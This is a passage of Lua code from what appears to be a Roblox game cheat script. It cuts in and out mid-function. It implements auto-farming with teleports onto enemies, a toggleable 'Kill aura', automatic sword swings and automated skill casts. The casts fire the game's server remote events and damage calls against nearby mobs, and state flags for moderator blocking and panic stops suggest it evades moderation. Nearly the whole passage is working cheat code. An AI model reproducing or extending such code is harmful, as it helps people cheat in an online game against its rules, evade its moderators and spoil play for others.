        nextAcquisition=now+.15
        local locked=state.FarmTargetLock
        if locked and state.MultiSpot and not state.IsSelectedFarmMob(locked)then locked=nil end
        local scopeMatches=state.FarmLockArena==state.MultiSpotAnchor and state.FarmLockProgression==state.ProgressionBossMob
        if not scopeMatches or not locked or locked.Parent~=mobs then locked=nil
        else
            local data=getMobData(locked)
            if data and (data.Health.Value<=0 or (data.HitLives and data.HitLives.Value<=0))then locked=nil end
        end
        local function admitted(mob)return validMob(mob,mobs)end
        if not state.AccountProgression and state.CreditController then locked=state.CreditController.FarmTarget(locked,trackedMobs,admitted,targetPriority.FarmLess)end
        if locked and not state.AccountProgression and state.GetFarmPriorityTarget then
            local higher=state.GetFarmPriorityTarget(now)
            if higher and targetPriority.FarmLess(higher,locked)then locked=higher end
        end
        if not locked then
            state.TargetScans+=1
            for candidate in pairs(trackedMobs)do
                local candidateRoot=admitted(candidate)
                if candidateRoot and (candidateRoot.Position-root.Position).Magnitude<=state.FarmRange and (not locked or targetPriority.FarmLess(candidate,locked))then locked=candidate end
            end
        end
        state.FarmTargetLock=locked;state.FollowTarget=locked
        state.FarmLockArena=state.MultiSpotAnchor;state.FarmLockProgression=state.ProgressionBossMob
        state.TargetPriority=locked and targetPriority.Rank(locked)or nil
        targetRoot=locked and admitted(locked)
    end
    -- END TEST FARM SELECTION
    if not targetRoot then
        if state.AccountProgression and state.ProgressionAnchor then
            state.FollowTarget=nil;waveDodge.Idle(state.ProgressionAnchor);movementStatus("Account Progression · waiting for the main boss");return
        end
        if state.MultiSpot and state.MultiSpotAnchor then
            state.FollowTarget=nil
            if not state.HoldMultiSpotIdle()then waveDodge.Idle()end
            movementStatus("Multi Spot · waiting for selected arena mobs");return
        end
        state.AutoOffsetTarget=nil;state.AutoOffsetDestination=nil;activeOffsetMob=nil;offsetSample=nil
        targetMissingSince=targetMissingSince or now
        waveDodge.Idle()
        movementStatus(now-targetMissingSince>.9 and "No loaded enemy · unlimited detection · idle -20"or "Waiting below the map · 20 studs")
        return
    end
    state.MultiSpotEmptySince=nil;targetMissingSince=nil;state.IdleBelowMap=false;state.Exploring=false;state.LastExploreDestination=nil
    if correctionTarget~=state.FollowTarget then correctionTarget=state.FollowTarget;correctionStrikes=0 end
    -- BEGIN TEST MOVEMENT BUDGET
    if state.FarmCoordination and not state.DodgeReturnPending and not targetDefeated and not state.FarmCoordination.Ready("move")then return end
    local autoOffset=state.ResolveAutoOffset(state.FollowTarget)
    if not autoOffset or not state.AutoFarm or state.TravelBusy then return end
    -- END TEST MOVEMENT BUDGET
    local destination = state.AutoOffsetDestination or targetRoot.Position+Vector3.new(0,autoOffset,0)
    lastSurfaceY=targetRoot.Position.Y+3
    if destination.Y<=workspace.FallenPartsDestroyHeight+30 then stopMovement("Paused · destination is too low");return end
    local current=state.FollowTarget
    local correction=teleportTarget==current and positionAlign and now>(state.OffsetGraceUntil or 0)and now-lastTeleportTime>.2
    if correction then
        local distance=(root.Position-positionAlign.Position).Magnitude
        local tolerance=math.clamp(targetRoot.AssemblyLinearVelocity.Magnitude*.25+3,5,12)
        if distance>tolerance and now-correctionWindow>.35 then
            correctionStrikes=now-correctionWindow>2.5 and 1 or correctionStrikes+1;correctionWindow=now
            state.TeleportCorrections=(state.TeleportCorrections or 0)+1
            if correctionStrikes>=3 then
                state.FarmPauseUntil=now+1;correctionStrikes=0;state.FollowTarget=nil;pauseHold("Reacquiring after position corrections");return
            end
            teleportTarget=nil
        elseif distance<2 and now-correctionWindow>2.5 then correctionStrikes=0 end
    end
    ensureMovementController(character,root,humanoid,destination)
    positionAlign.Position=destination;positionAlign.Enabled=true;orientationAlign.Enabled=true
    local changed=teleportTarget~=current
    if changed or (now-lastTeleportTime>=state.TeleportInterval and (destination-root.Position).Magnitude>3.5)then
        tweenFarmRoot(root,destination);teleportTarget=current;lastTeleportTime=now;lastTeleportPosition=destination;state.TeleportsSent+=1
        if changed then state.OffsetGraceUntil=now+.35 end
        if state.DodgeReturnPending then state.LastDodgeReturnDelay=os.clock()-(state.LastDodgeFinishedAt or os.clock());state.DodgeReturnPending=false end
    end
    if changed or now>=nextMovementStatusUpdate then
        nextMovementStatusUpdate=now+.2
        movementStatus(state.FixedFarmPosition and "Suspended Unborn · fixed arena position +10 studs"or string.format("Auto offset %.1f %s %s",math.abs(state.TeleportOffset),state.OffsetMode=="Above"and "above"or "below",current.Name))
    end
end

do
    local make=(function()
-- BEGIN BUNDLED AURA TOUCH
-- A small ownership ledger prevents duplicate native blade touches during aura use.
return function(ctx)
    local api={}
    local held=setmetatable({}, {__mode="k"})
    local container,listener
    local active,closed,nextCheck=false,false,0
    local function releaseBlades()
        for blade,value in pairs(held)do pcall(function()blade.CanTouch=value end)end
        table.clear(held)
    end
    local function own(blade)
        if not active or closed or not blade or blade.Name~="Blade"or not blade:IsA("BasePart")then return end
        local tool=blade.Parent;local weapon=tool and tool.Parent
        if not tool or tool.Name~="Tool"or not weapon or weapon.Parent~=container then return end
        if weapon.Name~="RightWeapon"and weapon.Name~="LeftWeapon"then return end
        pcall(function()
            if held[blade]==nil then held[blade]=blade.CanTouch end
            blade.CanTouch=false
        end)
    end
    local function switch(nextContainer)
        if listener then listener:Disconnect();listener=nil end
        releaseBlades();container=nextContainer
        if container then listener=container.DescendantAdded:Connect(own)end
    end
    function api.Update(now)
        if closed then return end
        now=now or os.clock()
        local desired=ctx.Active()==true
        if now<nextCheck and active==desired then return end
        nextCheck=now+.5;active=desired
        local nextContainer=ctx.Items()
        if nextContainer~=container then switch(nextContainer)end
        if not active then releaseBlades();return end
        if not container then return end
        for _,slot in ipairs({"RightWeapon","LeftWeapon"})do
            local weapon=container:FindFirstChild(slot)
            local tool=weapon and weapon:FindFirstChild("Tool")
            own(tool and tool:FindFirstChild("Blade"))
        end
    end
    function api.Destroy()
        if closed then return end
        closed=true;active=false;switch(nil)
    end
    return api
end

-- END BUNDLED AURA TOUCH
    end)()
    state.AuraTouch=make({Active=function()return state.Running and not state.StopEverything and (state.Enabled or state.SkillAura or state.CreditCheck)end,
        Items=function()
            local items=workspace:FindFirstChild("CharacterItems")
            return items and items:FindFirstChild(tostring(player.UserId))
        end})
end
local swingThread
local swingTrack
local swingClock={Due=0,Index=0}
local function swingAllowed()
    if state.BetweenPaceHolding or state.BlackoutHolding then return false end
    return state.Running and state.Enabled and state.AutoSwing and not state.StopEverything and not state.RemovingAnimations and not state.SkillCastRunning
end
local function stopSword(force)
    if not force and swingAllowed()then return end
    local active=swingTrack;swingTrack=nil;swingClock.Due=0;state.SwordSwinging=false
    if active and active.IsPlaying then active:Stop(.08)end
end
function state.SetAutoSwing(requested)
    state.AutoSwing=requested==true
    if not requested then stopSword(true)end
    requestSave()
end
local function playBurstSwing()
    if not swingAllowed()then return end
    local at=os.clock()
    if at<swingClock.Due then return end
    local character=player.Character
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health<=0 then stopSword(true);return end
    local equipped=state.WeaponSkills
    if equipped and not equipped.Ready then return end
    local class=equipped and equipped.Style or Combat.CalculateCombatStyle(false)
    local bank=Actions.animations[class]
    if not bank then return end
    swingClock.Index=swingClock.Index%3+1
    local animation=bank["Swing"..swingClock.Index]or bank.Swing1
    if not animation then return end
    if state.SkillVisuals then state.SkillVisuals.AllowSwingTrack(animation)end
    if swingTrack~=animation and swingTrack and swingTrack.IsPlaying then swingTrack:Stop(.06)end
    swingTrack=animation;animation:Play(.12,1,1)
    local duration=animation.Length>0 and animation.Length or .6
    swingClock.Due=at+math.max(.65,duration+.1)
    state.SwingStarts+=1;state.SwordSwinging=true;state.SwingMode="Continuous visuals"
end
local function updateAutoSwing()
    if swingAllowed()then playBurstSwing()else stopSword(true)end
end

do
    local activation=(function()
-- BEGIN BUNDLED SKILL ACTIVATION
-- Activation owns one native skill lease until explicit release.
return function(ctx)
    local api={}
    local durations={['Sweeping Strike']=1.4,['Downward Smash']=1,['Leaping Slash']=1.8,['Piercing Dash']=1,
        ['Beam Rush']=2.8,['Whirlwind Spin']=1,['Reaper Frenzy']=3.5,['Infinity Slash']=1,['Summon Pistol']=.2,
        ['Meteor Shot']=1,['Everfrost Strike']=1.5,['Cursed Three Fold Slash']=3.3,['Water Blast']=1.2,
        ['Spearitual Strike']=1,['Summon Rifle']=3,['Summon Minigun']=3}
    local profiles={['Summon Pistol']={FirstHitDelay=0},['Summon Rifle']={FirstHitDelay=0}}
    local cooldowns={}
    local lease
    local clock=ctx.Clock or os.clock
    local wait=ctx.Wait or task.wait
    function api.Window(name)return durations[name]or (ctx.ResolveWindow and ctx.ResolveWindow(name))end
    function api.Profile(name)return profiles[name]end
    function api.CanHandle(name)return api.Window(name)~=nil and clock()>=(cooldowns[name]or 0)end
    function api.Reset()table.clear(cooldowns)end
    local function permitted(current)return ctx.CanRun()and (not current or current())end
    function api.Release(name)
        if not lease or (name and name~=lease.Name)then return end
        if ctx.Skills.usingSkill==lease.Name then ctx.Skills.usingSkill="none"end
        lease=nil
    end
    function api.Result(name,damage,requests)ctx.State.LastSkillActivationResult={Name=name,Damage=damage,Requests=requests}end
    local function resources(name,definition,entity)
        if ctx.Skills.usingSkill and ctx.Skills.usingSkill~="none"then return nil,"Another skill is active"end
        if ctx.Skills.GetCooldown(name)<0 then return nil,"Waiting for cooldown"end
        local stamina=entity:FindFirstChild("Stamina")
        if not stamina or stamina.Value<definition.Cost.Value then return nil,"Waiting for stamina"end
        local buffs=entity:FindFirstChild("Buffs")
        local reduction=buffs and buffs:FindFirstChild("SkillReduction")
        return {Stamina=stamina,Before=stamina.Value,Cost=definition.Cost.Value,
            Cooldown=definition.Cooldown.Value*math.clamp(1-(reduction and reduction.Value or 0),0,1)}
    end
    function api.Begin(name,definition,entity,root,current,onEmit,aim)
        if not api.CanHandle(name)then return false,"Waiting for a supported activation window"end
        if not permitted(current)then return false,"Cast interrupted"end
        local budget,reason=resources(name,definition,entity)
        if not budget then return false,reason end
        local started=clock()
        local direction=typeof(aim)=="Vector3"and aim.Magnitude>.001 and aim.Unit or root.CFrame.LookVector
        lease={Name=name,Started=started,ExpiresAt=started+api.Window(name),FirstHitAt=started+(profiles[name]and profiles[name].FirstHitDelay or 0),
            SourceWindow=true,HoldWindow=true,RefreshTargets=true,MinimumInterval=.3,Direction=direction}
        local emitted=lease
        ctx.Skills.usingSkill=name;ctx.Skills.SetCooldown(name,budget.Cooldown)
        pcall(ctx.SkillUsed,name,budget.Cooldown)
        ctx.Emit(name,{Direction=direction});ctx.State.SkillActiveUntil=emitted.ExpiresAt
        if onEmit then onEmit(emitted)end
        local expires=clock()+math.clamp(.35+(ctx.State.PingMs or 100)/500,.4,1.2)
        while true do
            if budget.Cost<=0 or budget.Before-budget.Stamina.Value>=math.max(1,budget.Cost*.5)then return true,nil,emitted end
            if not budget.Stamina.Parent or not root.Parent or not permitted(current)then return false,"Cast interrupted"end
            wait(.02)
            if clock()>=expires then break end
        end
        cooldowns[name]=clock()+2
        return false,"Skill start not acknowledged; retrying after cooldown"
    end
    return api
end

-- END BUNDLED SKILL ACTIVATION
    end)()
    local function castable()
        if not state.Running or not state.SkillAura or state.BetweenPaceHolding then return false end
        for _,field in ipairs({"TravelBusy","Dodging","Recovering","ProtectionRetreating","StopEverything","SafeModePanic","ModeratorBlocking","AutoTradeBusy"})do
            if state[field]then return false end
        end
        local character=player.Character
        local entity=character and character:FindFirstChild("Entity")
        local health=entity and entity:FindFirstChild("Health")
        return health~=nil and health.Value>0
    end
    state.SkillActivation=activation({State=state,Skills=Skills,SkillUsed=GameUI.SkillUsed,CanRun=castable,
        ResolveWindow=function(name)if AttackStats[name]and Skills.skillHandlers[name]then return 1 end end,
        Emit=function(name,options)
            options.TimeStarted=workspace:GetServerTimeNow()
            local character=player.Character;local root=character and character:FindFirstChild("HumanoidRootPart")
            if root and state.SkillVisuals then state.SkillVisuals.MarkGunCast(name,root.Position)end
            ReplicatedStorage.Event:FireServer("Skills",{"UseSkill",name,options})
        end})
end
local skillThread,nextSkillCheck=nil,0
local skillCastSerial=0
function state.WakeSkillAura()nextSkillCheck=0 end
function state.CancelSkillAura(message)
    local active=state.ActiveSkillCast
    state.ReserveGunStamina=false;state.SkillRegistrationTarget=nil
    if active then
        active.Cancelled=true
        if active.Multi then active.Multi.Cancel(message or "Cast interrupted")end
        state.SkillActivation.Release(active.Name)
    end
    local observe=state.FinishSkillObservation;state.FinishSkillObservation=nil
    if observe then pcall(observe)end
    if skillThread then pcall(task.cancel,skillThread);skillThread=nil end
    state.ActiveSkillCast=nil;state.SkillPreparing=false;state.SkillCastRunning=false;state.SkillWantsWindow=false
    state.CombatReadyAt=os.clock();nextSkillCheck=0
end
state.CleanupSkillCast=state.CancelSkillAura
state.SkillDamageBudget=(function()
-- BEGIN BUNDLED SKILL DAMAGE BUDGET
-- Per-cast reservations are observations, never mutations of replicated health.
return function()
    local api={}
    local values,slots={},{}
    local cursor=1
    function api.Estimate(key)return values[key]or 0 end
    function api.Learn(key,damage,requests,smallest)
        if type(damage)~="number"or damage~=damage or damage<=0 or damage==math.huge or not requests or requests<=0 then return end
        local amount=damage/requests
        if smallest and smallest>0 then amount=math.min(amount,smallest)end
        if values[key]then values[key]=math.min(values[key],amount);return end
        if slots[cursor]then values[slots[cursor]]=nil end
        slots[cursor]=key;cursor=cursor%128+1;values[key]=amount
    end
    local function rebase(item,health,now)
        if not item.ReservationUntil or item.ReservationUntil<=now then
            item.ReservationBase=health;item.ReservedDamage=0
        end
    end
    function api.Remaining(item,health,now)
        rebase(item,health,now)
        return math.min(health,(item.ReservationBase or health)-(item.ReservedDamage or 0))
    end
    function api.Reserve(item,health,damage,now,ttl)
        rebase(item,health,now)
        if not damage or damage<=0 then return end
        item.ReservedDamage=(item.ReservedDamage or 0)+damage
        item.ReservationUntil=now+(ttl or .5)
    end
    return api
end

-- END BUNDLED SKILL DAMAGE BUDGET
end)()()
local function updateSkillAura()
    local now=os.clock()
    if now<nextSkillCheck then return end
    nextSkillCheck=now+(state.NetworkPressureLimited and .04 or 1/60)
    state.SkillWantsWindow=false;state.SkillPreparing=false;state.ReserveGunStamina=false;state.SkillRegistrationTarget=nil
    if state.BetweenPaceHolding or not state.SkillAura or state.StopEverything or state.SafeModePanic or state.MultiSpotOwnsTravel or state.MultiSpotTravelPending then return end
    local weapons=state.WeaponSkills
    local name=state.SelectedSkill
    if not(weapons and weapons.Ready and weapons.IsCompatible(name))then state.SkillStatus="Waiting for equipped weapon skills";return end
    if state.ActiveSkillCast or skillThread or Skills.usingSkill~="none"then return end
    if state.MiscReserveStamina or state.MiscCastRunning then state.SkillStatus="Reserving stamina for Misc Skill";return end
    if state.TravelBusy or state.Dodging or state.Recovering or now<(state.FarmPauseUntil or 0)
        or now<(state.LagPauseUntil or 0)or now<(state.SkillRetryAt or 0)or(state.PingMs and state.PingMs>500)then return end
    local character=player.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    local entity=character and character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    if not(root and health and health.Value>0)then return end
    local definition=ReplicatedStorage.Database.Skills:FindFirstChild(name)
    if not definition or not GameUI.IsSkillValid(definition)then weapons.Notify("Updating compatible weapon skill");return end
    local cooldown=Skills.GetCooldown(name)
    if cooldown<0 then nextSkillCheck=now+math.clamp(-cooldown,1/60,.25);return end
    if not state.SkillActivation.Profile(name)and not Skills.HasStamina(definition.Cost.Value)then return end
    if not(CanRunSkill(player,name)and not GameUI.IsMenuOpen()and state.SkillActivation.CanHandle(name))then return end
    local mobs=refreshMobIndex()
    local target,targetRoot
    local function consider(mob)
        local candidate=validMob(mob,mobs)
        if not candidate then return end
        local data=getMobData(mob)
        if state.CreditController and not state.CreditController.AllowAction(mob,data,"SkillStart")then return end
        if attackDeltaFor(data,root).Magnitude>state.AutoRanges.Range("Skill",data,name)then return end
        if not target or targetPriority.Less(mob,target,root.Position,state.AutoFarm and state.FollowTarget or nil)then target=mob;targetRoot=candidate end
    end
    local primary=state.AutoFarm and state.FollowTarget
    if primary then consider(primary)end
    for mob in pairs(trackedMobs)do if mob~=primary then consider(mob)end end
    if not target then nextSkillCheck=now+(state.NetworkPressureLimited and .15 or .08);return end
    if state.ReadOwnDamage(getMobData(target).Health)==nil then
        state.SkillRegistrationTarget=target;state.SkillStatus="Registering enemy before skill activation";return
    end
    if not Skills.HasStamina(definition.Cost.Value)then
        state.ReserveGunStamina=true;state.SkillWantsWindow=true;state.SkillStatus="Recovering stamina for "..name;return
    end
    state.SkillWantsWindow=true;state.SkillPreparing=true
    if state.AttackBurstActive then finishAttackBurst("Handing off to ready skill")end
    if not normalScheduler.Ready(target,now)then return end
    state.SkillPreparing=false;state.SkillCastRunning=true;skillCastSerial+=1
    local cast={Id=skillCastSerial,Name=name,Version=weapons.Version,Character=character,Cancelled=false,
        RecoveryDeadline=now+math.max(8,(state.SkillActivation.Window(name)or 4)+3)}
    state.ActiveSkillCast=cast;state.AttackingTarget=target;trackHealth(target)
    state.SkillExecution="Source window";state.SkillStatus="Casting "..name
    local function current()
        if state.BetweenPaceHolding or cast.Cancelled or cast.CreditFinished or state.ActiveSkillCast~=cast then return false end
        if not(state.Running and state.SkillAura and weapons.Ready and weapons.Version==cast.Version and state.SelectedSkill==name)then return false end
        if character~=player.Character or root.Parent==nil or health.Value<=0 or os.clock()<state.LagPauseUntil then return false end
        return not(state.StopEverything or state.TravelBusy or state.Dodging or state.SafeModePanic or state.ModeratorBlocking or state.AutoTradeBusy or state.Recovering)
    end
    skillThread=task.defer(function()
        local burst={Skill=name,Target=target.Name,Requested=0,HealthDrops=0,Before=0,Direct=true,Status="Activating equipped weapon skill"}
        state.LastSkillBurst=burst;state.LastSkillBurstSize=0
        local observationComplete=false
        local function observe()
            if observationComplete or not cast.Multi then return end
            observationComplete=true;cast.Multi.Finish()
            state.SkillActivation.Result(name,burst.Damage,burst.TotalRequests)
            for _,item in ipairs(burst.Targets or {})do
                local data=getMobData(item.Target)
                if data and state.CreditController then state.CreditController.Observe(item.Target,data)end
                local settled=not burst.ObservationReadyAt or os.clock()>=burst.ObservationReadyAt
                if data and not cast.Cancelled and state.ReadOwnDamage(item.Health,item.Counter)~=nil
                    and(item.Damage>0 or(settled and data.Health.Value>0))then
                    if item.Damage>0 and item.Requested>0 then
                        local key=name..":"..cast.Version
                        if state.CreditDamagePlanner and not cast.CreditFinished then state.CreditDamagePlanner.Learn("Cast:"..key..":"..item.TargetName,item.Damage)end
                        state.SkillDamageBudget.Learn(key,item.Damage,item.Requested,item.MinimumHealthDrop)
                        state.SkillDamageBudget.Learn(key..":"..item.TargetName,item.Damage,item.Requested,item.MinimumHealthDrop)
                    end
                    state.AutoRanges.Record("Skill",item.RangeDistance,item.Damage,data,name)
                end
            end
            if state.FinishSkillObservation==observe then state.FinishSkillObservation=nil end
        end
        local function valid(mob)
            if not current()or not validMob(mob,mobs)then return nil end
            local data=getMobData(mob)
            if not data or data.Health.Value<=0 or(data.HitLives and data.HitLives.Value<=0)or os.clock()<(data.SkipUntil or 0)
                or data.Entity:FindFirstChild("Immortal")then return nil end
            if attackDeltaFor(data,root).Magnitude<=state.AutoRanges.Range("Skill",data,name)then return data end
        end
        local function beginWindow(lease)
            if cast.Multi then return end
            cast.Lease=lease
            burst.DamageSkill=name;burst.Spacing=math.max(.3,state.SkillBurstInterval,lease.MinimumInterval or 0)
            burst.ActivationAt=lease.Started;burst.FirstHitAt=lease.FirstHitAt;burst.AimDirection=lease.Direction
            cast.Multi=createSkillBurst({State=state,Record=burst,Spacing=burst.Spacing,Contribution=state.ReadOwnDamage,
                SourceWindow=lease.SourceWindow,Pacing=normalScheduler,FirstHitAt=lease.FirstHitAt,RefreshTargets=true,
                ExpiresAt=lease.ExpiresAt,FocusBudget=true,Budget=state.SkillDamageBudget,Valid=valid,
                EstimateDamage=function(mob)
                    local key=name..":"..cast.Version;local amount=state.SkillDamageBudget.Estimate(key..":"..mob.Name)
                    return amount>0 and amount or state.SkillDamageBudget.Estimate(key)
                end,
                Targets=function()
                    local result={}
                    for mob in pairs(trackedMobs)do if valid(mob)then result[#result+1]=mob end end
                    table.sort(result,function(a,b)return targetPriority.Less(a,b,root.Position,target)end)
                    return result
                end,
                Distance=function(_,data)return(data.Root.Position-root.Position).Magnitude end,
                RangeDistance=function(_,data)return attackDeltaFor(data,root).Magnitude end,
                CanRun=function()return current()and os.clock()<lease.ExpiresAt end,
                Send=function(mob,entry)
                    if not current()then return false end
                    local credit=state.CreditController
                    if credit and not credit.AllowAction(mob,entry,"Skill")then
                        if mob==target and(credit.ActionReason=="Normal"or credit.ActionReason=="Qualified")then cast.CreditFinished=true end
                        return false
                    end
                    if state.MultiSpotEncounter and(not state.MultiSpotPriorityActive or state.MultiSpotEncounter[mob])then state.MultiSpotEncounter[mob]=true end
                    if credit then credit.Sent(mob,entry,"Skill")end
                    Combat.DealDamage(mob,name)
                    state.LastEnemyAttackAt=os.clock();state.LastEnemyAttackTarget=mob;state.LastEnemyAttackKind="Skill";state.LastEnemyAttackSkill=name
                    healthHUD.Touch(mob);entry.OffsetRequests=(entry.OffsetRequests or 0)+1
                end,
            })
            if not cast.Multi.Start(target,table.pack())then burst.Status="Target changed before skill damage"end
        end
        local ok,reason=pcall(function()
            if state.FinishSkillObservation then state.FinishSkillObservation()end
            if not current()then return end
            local aimRoot=validMob(target,mobs)
            local currentData=aimRoot and getMobData(target)
            if not currentData or attackDeltaFor(currentData,root).Magnitude>state.AutoRanges.Range("Skill",currentData,name)then burst.Status="Target moved before skill activation";return end
            local direction=aimRoot.Position-root.Position
            if not state.SkillActivation.Profile(name)then direction=direction*Vector3.new(1,0,1)end
            stopSword(true)
            if state.AutoFarm and movementRoot==root and positionAlign and positionAlign.Enabled then positionAlign.Position=root.Position end
            local ack,message,lease=state.SkillActivation.Begin(name,definition,entity,root,current,function(window)
                if current()then beginWindow(window)end
            end,direction)
            burst.ActivationAcknowledged=ack
            if not ack or not current()then
                if cast.Multi then cast.Multi.Cancel(message or "Cast interrupted")end
                burst.Status=message or "Equipment changed during activation";return
            end
            beginWindow(lease)
            while cast.Multi and cast.Multi.Started and current()and not burst.FinishedAt and os.clock()<cast.Multi.Deadline do task.wait(.03)end
            if cast.Multi and not burst.FinishedAt and not current()then cast.Multi.Cancel(cast.CreditFinished and "Credit plan · ending skill hits"or "Equipment or game state changed")end
            while lease.HoldWindow and current()and os.clock()<lease.ExpiresAt do task.wait(.03)end
            if not cast.Multi or not cast.Multi.Started then return end
            local settle=math.clamp((state.PingMs or 150)/1000+.1,.25,.6)
            state.FinishSkillObservation=observe;burst.ObservationReadyAt=os.clock()+settle
            task.delay(settle,observe);state.SkillCasts+=1
        end)
        state.SkillActivation.Release(name)
        if not ok then
            state.LastSkillError=tostring(reason);state.SkillRetryAt=os.clock()+1;burst.Status=tostring(reason)
            if cast.Multi then cast.Multi.Cancel("Skill cast error")end
        end
        if state.ActiveSkillCast==cast then
            state.ActiveSkillCast=nil;state.SkillCastRunning=false;state.SkillWantsWindow=false;skillThread=nil;state.CombatReadyAt=os.clock()
        end
        local history=state.SkillBurstHistory;history[#history+1]=burst
        while #history>8 do table.remove(history,1)end
        state.OffsetGraceUntil=os.clock()+.5
    end)
end


do
    local profile=ReplicatedStorage.Profiles:FindFirstChild(player.Name)
    local equip=profile and profile:FindFirstChild("Equip")
    local util=require(services.Util)
    local factory=(function()
-- BEGIN BUNDLED WEAPON SKILLS
-- Equipment changes invalidate casts; a settled snapshot selects one usable skill.
return function(ctx)
    local state=ctx.State
    local api={Ready=false,Version=0,Style="",Skills={}}
    local defaults={SingleSword="Sweeping Strike",["2HSword"]="Downward Smash",DualWield="Whirlwind Spin",
        Rapier="Piercing Dash",Katana="Leaping Slash",Spear="Beam Rush",Scythe="Reaper Frenzy"}
    local aliases={singlesword="SingleSword",["1hsword"]="SingleSword",["2hsword"]="2HSword",
        dualwield="DualWield",rapier="Rapier",katana="Katana",spear="Spear",scythe="Scythe"}
    local preferences=state.SkillPerWeaponVersion==2 and type(state.SkillPerWeapon)=="table"and state.SkillPerWeapon or {}
    state.SkillPerWeapon=preferences;state.SkillPerWeaponVersion=2
    local available={}
    local observed={Key=nil,Character=nil}
    local pending,settleAt,pollAt,refreshAt=true,0,0,0
    function api.Class(style)
        local label=tostring(style or "")
        return aliases[label:lower():gsub("[^%w]","")]or label
    end
    local function cancel(reason)if ctx.Cancel then ctx.Cancel(reason)end end
    function api.Notify(reason,now)
        pending=true;settleAt=(now or os.clock())+.18
        api.Ready=false;api.Version+=1;state.SkillWeaponVersion=api.Version
        state.SkillStatus=reason or "Updating equipped weapon skills"
        cancel(reason or "Equipment changed")
    end
    function api.Choices()return api.Skills end
    function api.IsCompatible(name)return api.Ready and available[name]~=nil end
    local function publish(name)
        state.SelectedSkill=name or "";state.SkillWeaponStyle=api.Style
        if ctx.Changed then ctx.Changed(state.SelectedSkill,api.Skills)end
    end
    function api.Select(name)
        if not api.IsCompatible(name)then return false end
        if state.SelectedSkill~=name then cancel("Selected skill changed")end
        preferences[api.Style]=name;publish(name);return true
    end
    local function resolve(snapshot)
        local oldStyle=api.Style
        api.Style=api.Class(snapshot.Style)
        local list={};available={}
        for _,entry in ipairs(snapshot.Skills)do
            if entry.Allowed and not available[entry.Name]then available[entry.Name]=entry;list[#list+1]=entry.Name end
        end
        table.sort(list);api.Skills=list
        local choice
        if available["Summon Pistol"]then choice="Summon Pistol"
        elseif available[preferences[api.Style]]then choice=preferences[api.Style]
        elseif (oldStyle==""or oldStyle==api.Style)and available[state.SelectedSkill]then choice=state.SelectedSkill
        elseif available[defaults[api.Style]]then choice=defaults[api.Style]
        else choice=list[1]end
        if (choice or "")~=state.SelectedSkill then cancel("Available skill changed")end
        if oldStyle==""and choice and choice~="Summon Pistol"then preferences[api.Style]=choice end
        api.Ready=true;publish(choice)
    end
    function api.Update(now)
        now=now or os.clock()
        if not pending and now<pollAt then return end
        pollAt=now+.25
        local key,character=ctx.Key()
        if key~=observed.Key or character~=observed.Character then
            observed.Key,observed.Character=key,character;api.Notify("Equipped weapon changed",now)
        end
        if not pending and now>=refreshAt then pending=true;settleAt=now end
        if not pending or now<settleAt then return end
        resolve(ctx.Read());pending=false;refreshAt=now+2
    end
    return api
end

-- END BUNDLED WEAPON SKILLS
    end)()
    local signature
    local function combatStyle()
        local ok,value=pcall(Combat.CalculateCombatStyle,false)
        return ok and value or ""
    end
    local function key()
        local right=equip and equip:FindFirstChild("Right")
        local left=equip and equip:FindFirstChild("Left")
        return table.concat({tostring(right and right.Value or 0),tostring(left and left.Value or 0),combatStyle()},":"),player.Character
    end
    local function skillsForWeapon()
        local stats=profile and profile:FindFirstChild("Stats")
        local experience=stats and stats:FindFirstChild("Exp")
        local level=experience and util.LevelFromExp(experience.Value)or 0
        local result={}
        for _,definition in ipairs(ReplicatedStorage.Database.Skills:GetChildren())do
            local name=definition.Name
            if AttackStats[name]and type(Skills.skillHandlers[name])=="function"and state.SkillActivation.Window(name)then
                local ok,valid=pcall(GameUI.IsSkillValid,definition)
                local required=definition:FindFirstChild("Level")
                result[#result+1]={Name=name,Allowed=ok and valid==true and(not required or required.Value<=level)}
            end
        end
        return {Style=combatStyle(),Skills=result}
    end
    local resolver=factory({State=state,Key=key,Read=skillsForWeapon,
        Cancel=function(reason)state.CancelSkillAura(reason);state.SkillActivation.Reset();stopSword(true)end,
        Changed=function(name,choices)
            local nextSignature=name.."|"..table.concat(choices,",")
            if nextSignature==signature then return end
            signature=nextSignature;skillDropdown.Text=name~=""and name.."  v"or "Select skill"
            refreshSkillChoices();state.SkillRetryAt=0;requestSave()
        end})
    state.WeaponSkills=resolver
    local function invalidated()resolver.Notify("Equipment or unlocked skills changed")end
    if equip then
        for _,slot in ipairs({"Right","Left"})do local value=equip:FindFirstChild(slot);if value then bind(value.Changed,invalidated)end end
    end
    local unlocked=profile and profile:FindFirstChild("Skills")
    if unlocked then bind(unlocked.ChildAdded,invalidated);bind(unlocked.ChildRemoved,invalidated)end
    bind(player.CharacterAdded,invalidated)
    state.WeaponSkillsDestroy=function()state.CancelSkillAura("Weapon controller closed")end
    resolver.Update()
end
function state.SetEnabled(requested)
    if not state.Running or(requested and state.StopEverything)then return false end
    state.Enabled=requested==true
    if state.AuraTouch then state.AuraTouch.Update()end
    if state.Enabled then state.AutoSwing=true else finishAttackBurst("Paused");stopSword(true)end
    state.LastError=nil;consecutiveErrors=0;nextTargetRefresh=0;state.Backoff=1
    table.clear(lastHit);table.clear(pendingDamage)
    toggle.Text=state.Enabled and "Kill aura · ON"or "Kill aura · OFF"
    toggle.BackgroundColor3=state.Enabled and Color3.fromRGB(114,88,229)or Color3.fromRGB(45,48,63)
    requestSave();return true
end
function state.SetRadius(requested)
    state.Radius=math.clamp(math.floor(tonumber(requested)or state.Radius),20,120);nextTargetRefresh=0
end
local guardHealth,guardConnection,guardLastValue
local nextGuardRefresh=0
local function updateHealthGuard(now)
    now=now or os.clock()
    if now<nextGuardRefresh then return end
    nextGuardRefresh=now+.5
    local character=player.Character
    local entity=character and character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    if health==guardHealth then return end
    if guardConnection then guardConnection:Disconnect();guardConnection=nil end
    guardHealth=health;guardLastValue=health and health.Value
    if not health then return end
    guardConnection=health:GetPropertyChangedSignal("Value"):Connect(function()
        local before=guardLastValue;guardLastValue=health.Value
        if not before or guardLastValue>=before or not state.Running or state.StopEverything then return end
        local active=state.AutoFarm or state.SkillCastRunning or os.clock()<(state.ProtectionUntil or 0)
            or((state.Enabled or state.SkillAura)and state.AttackingTarget and state.AttackingTarget.Parent)
        if not active then return end
        local root=character:FindFirstChild("HumanoidRootPart")
